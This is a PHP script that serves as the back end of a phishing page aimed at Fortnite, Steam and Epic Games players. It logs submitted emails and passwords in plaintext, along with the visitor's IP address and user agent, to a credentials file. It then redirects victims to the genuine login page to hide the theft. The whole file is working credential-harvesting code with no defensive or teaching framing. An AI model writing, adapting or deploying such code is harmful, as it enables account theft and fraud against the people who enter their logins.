<?php

// Set error reporting
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);

// Get the current date and time
$date = date("Y-m-d");
$time = date("h:i:sa");

// Get the user's IP address
function getIPAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = getIPAddress();
$useragent = $_SERVER['HTTP_USER_AGENT'];

// Get form data
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$game = $_GET['game'] ?? 'unknown';

// Log IP address
$ip_log = "data/ip_log.txt";
$ip_entry = "[$date $time] IP: $ip | Game: $game\n";
file_put_contents($ip_log, $ip_entry, FILE_APPEND);

// Log credentials if they exist
if (!empty($email) && !empty($password)) {
    $creds_log = "data/credentials.txt";
    $entry = "[$date $time] Game: $game | Email: $email | Password: $password | IP: $ip | User-Agent: $useragent\n";
    file_put_contents($creds_log, $entry, FILE_APPEND);
}

// Redirect based on game
$redirects = [
    'fortnite' => 'https://www.epicgames.com/fortnite',
    'steam' => 'https://store.steampowered.com/login',
    'epic' => 'https://www.epicgames.com/id/login',
    'default' => 'https://www.google.com'
];

$redirect_url = $redirects[strtolower($game)] ?? $redirects['default'];

// Send the user to the real login page
header("Location: $redirect_url");
exit();

?>
